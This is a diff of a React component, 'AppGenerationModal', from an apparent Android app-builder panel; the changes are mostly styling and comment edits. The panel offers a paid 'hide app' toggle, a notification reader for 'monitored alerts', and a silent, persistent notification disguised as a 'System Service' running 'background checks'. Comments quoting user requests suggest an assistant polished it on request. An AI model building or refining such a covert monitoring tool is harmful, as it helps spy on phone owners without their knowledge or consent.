@@ -1,11 +1,13 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import CustomAlertModal from './CustomAlertModal';
 import { 
-    Smartphone, Shield, Bell, CheckCircle2, Info,
-    Mail, Gamepad2, Film, Flame, Globe, Upload, AlertTriangle, Sliders,
-    ChevronDown, ChevronUp, MousePointerClick, Wifi, BatteryCharging, Signal
+    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
+    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
+    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
+    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
+    Settings, MousePointerClick
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -198,7 +200,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         setIsStyleMenuOpen(false);
     };
 
-    // Ordered Click Actions: #1 device_info, #2 none ("do nothing wala second number pe rakho"), and NO app launch option!
+    // Exactly ordered: 1st App Info, 2nd Do Nothing, then system settings, etc. (Removed launch app link)
     const CLICK_ACTIONS: Record<string, { label: string; desc: string }> = {
         device_info: { label: "Open App Info & Permissions", desc: "Opens Android system App Info & Permissions screen" },
         none: { label: "Do Nothing (Silent Background)", desc: "Ignores taps, keeps notification running silently in drawer" },
@@ -439,7 +441,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     };
 
-    // Realistic Android screen icon renderer
+    // Realistic Android screen icon renderer (STRICTLY ISOLATED BY PRESET)
     const renderRealisticIcon = () => {
         if (selectedPreset === 'custom') {
             if (customIconPreview) {
@@ -630,7 +632,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             />
                                         </div>
 
-                                        {/* Package Identifier */}
+                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                         <div>
                                             <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                             <input
@@ -733,7 +735,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     setHideApp(!hideApp);
                                                 }}
                                                 className={`w-11 h-6 rounded-full transition-colors relative ${
-                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
+                                                }`}
                                             >
                                                 <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                             </button>
@@ -778,7 +781,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Notification Reader - Soft Sky */}
+                                {/* Notification Reader (Monitored Alerts) - Soft Sky */}
                                 <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -960,7 +963,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                     {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & ACTION */}
                     {activeStep === 'notifications' && (
-                        <div className="space-y-6 pb-2">
+                        <div className="space-y-6">
                             
                             {/* Header Indicator */}
                             <div className="flex items-center gap-2.5 px-1">
@@ -970,11 +973,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </span>
                             </div>
 
+                            {/* Custom UI Dropdown Selector for Notification Style */}
                             <div className="space-y-4">
-                                {/* 1. Notification Display Style Selector */}
                                 <div className="relative">
                                     <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Display Style</label>
                                     
+                                    {/* Custom UI Card Dropdown Button */}
                                     <button
                                         type="button"
                                         onClick={() => {
@@ -998,16 +1002,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         <ChevronDown size={18} className={`text-emerald-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
                                     </button>
 
-                                    {/* Style Dropdown Card List */}
+                                    {/* Custom UI Dropdown List */}
                                     {isStyleMenuOpen && (
-                                        <div className="mt-2 bg-[#18191c] border border-emerald-500/40 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                             {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                                 <button
                                                     key={key}
                                                     type="button"
                                                     onClick={() => handleSelectStyle(key)}
-                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors ${
-                                                        notificationStyle === key ? 'bg-emerald-500/20 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
+                                                        notificationStyle === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
                                                     }`}
                                                 >
                                                     <div className="flex items-center gap-3">
@@ -1024,16 +1028,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     )}
                                 </div>
 
-                                {/* 2. HIGHLIGHTED GLOWING Selector for On-Click Action ("glow kar do sath ma & do nothing second pe & remove app link") */}
+                                {/* Glowing Highlighted Custom UI Dropdown Selector for On-Click Action ("Open Device System Settings highlighted & glowing") */}
                                 <div className="relative">
                                     <label className="block text-xs font-bold text-emerald-300 uppercase tracking-widest mb-2 flex items-center gap-1.5">
                                         <span>When User Taps Notification</span>
-                                        <span className="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-400/40 text-[9px] font-black">
-                                            ACTIVE ACTION
+                                        <span className="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[9px] font-extrabold">
+                                            ACTION
                                         </span>
                                     </label>
                                     
-                                    {/* Highlighting & Glowing Active Action Dropdown Box */}
                                     <button
                                         type="button"
                                         onClick={() => {
@@ -1041,27 +1044,27 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             setIsStyleMenuOpen(false);
                                             setIsIconMenuOpen(false);
                                         }}
-                                        className="w-full bg-gradient-to-r from-emerald-950/40 via-black/80 to-emerald-950/40 border-2 border-emerald-400/70 hover:border-emerald-300 rounded-2xl p-4 flex items-center justify-between text-left transition-all shadow-[0_0_25px_rgba(16,185,129,0.3)] scale-[1.01]"
+                                        className="w-full bg-gradient-to-r from-emerald-500/10 via-teal-500/10 to-cyan-500/10 border border-emerald-400/60 hover:border-emerald-300 rounded-2xl p-4 flex items-center justify-between text-left transition-all shadow-[0_0_20px_rgba(16,185,129,0.25)] scale-[1.005]"
                                     >
-                                        <div className="flex items-center gap-3.5">
-                                            <div className="w-9 h-9 rounded-xl bg-emerald-500/20 border border-emerald-400/50 flex items-center justify-center text-emerald-300 shadow-inner">
+                                        <div className="flex items-center gap-3">
+                                            <div className="w-9 h-9 rounded-xl bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center text-emerald-300 shadow-inner">
                                                 <MousePointerClick size={18} />
                                             </div>
                                             <div>
-                                                <div className="text-sm font-black text-white tracking-wide">
+                                                <div className="text-xs font-extrabold text-white tracking-wide">
                                                     {CLICK_ACTIONS[notificationClickAction]?.label || "Open App Info & Permissions"}
                                                 </div>
-                                                <div className="text-xs text-emerald-200/80">
+                                                <div className="text-[11px] text-emerald-200/80">
                                                     {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android system App Info & Permissions screen"}
                                                 </div>
                                             </div>
                                         </div>
-                                        <ChevronDown size={20} className={`text-emerald-300 transition-transform flex-shrink-0 ${isActionMenuOpen ? 'rotate-180' : ''}`} />
+                                        <ChevronDown size={18} className={`text-emerald-300 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
                                     </button>
 
-                                    {/* Clean Compact Action Dropdown Card List (No overflow freezing!) */}
+                                    {/* Action Dropdown List - Ordered 2nd Do Nothing, clean layout without freezing or pushing down overflow */}
                                     {isActionMenuOpen && (
-                                        <div className="mt-2.5 bg-[#14181B] border-2 border-emerald-500/50 rounded-2xl shadow-[0_15px_40px_rgba(0,0,0,0.9)] overflow-hidden divide-y divide-white/10 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                        <div className="mt-2 bg-[#18191c] border border-emerald-500/40 rounded-2xl shadow-[0_10px_35px_rgba(0,0,0,0.8)] overflow-hidden divide-y divide-white/10 max-h-60 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                             {Object.entries(CLICK_ACTIONS).map(([key, item]) => (
                                                 <button
                                                     key={key}
@@ -1071,21 +1074,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                         setIsActionMenuOpen(false);
                                                     }}
                                                     className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
-                                                        notificationClickAction === key ? 'bg-emerald-500/25 text-white font-black' : 'hover:bg-white/5 text-fg-2'
+                                                        notificationClickAction === key ? 'bg-emerald-500/25 text-white font-bold border-l-4 border-emerald-400' : 'hover:bg-white/5 text-fg-2'
                                                     }`}
                                                 >
                                                     <div>
-                                                        <div className="text-xs font-black text-white">{item.label}</div>
-                                                        <div className="text-[11px] text-fg-3 leading-tight mt-0.5">{item.desc}</div>
+                                                        <div className="text-xs font-extrabold text-white">{item.label}</div>
+                                                        <div className="text-[11px] text-fg-4 leading-snug">{item.desc}</div>
                                                     </div>
-                                                    {notificationClickAction === key && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0" />}
+                                                    {notificationClickAction === key && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0 ml-2" />}
                                                 </button>
                                             ))}
                                         </div>
                                     )}
                                 </div>
 
-                                {/* 3. Custom UI Dropdown Selector for Notification Status Bar Icon */}
+                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon */}
                                 <div className="relative">
                                     <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Status Bar Icon</label>
                                     
@@ -1109,7 +1112,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                     {/* Icon Dropdown List */}
                                     {isIconMenuOpen && (
-                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-48 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
                                             {Object.entries(ICON_OPTIONS).map(([key, item]) => (
                                                 <button
                                                     key={key}
@@ -1159,42 +1162,36 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                 )}
 
-                                {/* BREATHTAKING HIGHLIGHTED Live Android Status Bar Preview Card ("niche preview wala acha karo highlight karo") */}
-                                <div className="mt-4 rounded-3xl bg-gradient-to-b from-[#181C20] via-[#121518] to-black border-2 border-emerald-500/40 p-4 shadow-[0_15px_35px_rgba(16,185,129,0.15)] space-y-3 relative overflow-hidden">
-                                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-emerald-500 via-teal-400 to-cyan-500" />
-                                    
-                                    <div className="flex items-center justify-between text-[10px] font-black text-emerald-300 uppercase tracking-widest px-1">
-                                        <span>LIVE ANDROID 14 STATUS BAR PREVIEW</span>
-                                        <div className="flex items-center gap-2 text-fg-3">
-                                            <Wifi size={12} className="text-emerald-400" />
-                                            <Signal size={12} className="text-emerald-400" />
-                                            <BatteryCharging size={13} className="text-emerald-400" />
+                                {/* Highlighted & Polished Live Android Status Bar Preview Card ("nicha preview wala osa thora acha karo highlight karo") */}
+                                <div className="bg-gradient-to-br from-[#161a23] via-[#10131a] to-[#0a0d14] rounded-3xl p-5 border border-emerald-500/30 shadow-[0_0_25px_rgba(16,185,129,0.12)] space-y-3">
+                                    <div className="flex items-center justify-between">
+                                        <div className="flex items-center gap-2">
+                                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                                            <span className="text-[10px] font-extrabold text-emerald-300 uppercase tracking-widest">LIVE ANDROID STATUS BAR PREVIEW</span>
                                         </div>
+                                        <span className="text-[10px] font-mono text-fg-4">now</span>
                                     </div>
 
-                                    {/* Realistic Android Notification Drawer Card */}
-                                    <div className="p-3.5 rounded-2xl bg-[#22272B] border border-white/15 shadow-lg flex items-center justify-between">
+                                    {/* Realistic Notification Drawer Card */}
+                                    <div className="flex items-center justify-between p-4 rounded-2xl bg-black/60 border border-white/10 shadow-md">
                                         <div className="flex items-center gap-3.5">
-                                            <div className="w-10 h-10 rounded-xl bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center text-xl shadow-inner">
+                                            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-xl shadow-inner">
                                                 {ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}
                                             </div>
                                             <div>
-                                                <div className="flex items-center gap-2">
-                                                    <span className="text-xs font-black text-white">
-                                                        {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
-                                                    </span>
-                                                    <span className="text-[9px] text-fg-4 font-mono">• now</span>
+                                                <div className="text-xs font-black text-white">
+                                                    {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
                                                 </div>
-                                                <div className="text-[11px] text-fg-2 mt-0.5">
+                                                <div className="text-[11px] text-fg-3 mt-0.5">
                                                     {notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : NOTIFICATION_PRESETS[notificationStyle]?.text}
                                                 </div>
                                             </div>
                                         </div>
                                         <div className="flex flex-col items-end gap-1">
-                                            <span className="px-2 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[9px] font-extrabold uppercase">
-                                                ACTIVE
+                                            <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[9px] font-bold text-emerald-300 uppercase">
+                                                SILENT
                                             </span>
-                                            <span className="text-[9px] text-fg-4 font-mono">Ongoing</span>
+                                            <span className="text-[9px] text-fg-4 font-mono">Persistent</span>
                                         </div>
                                     </div>
                                 </div>
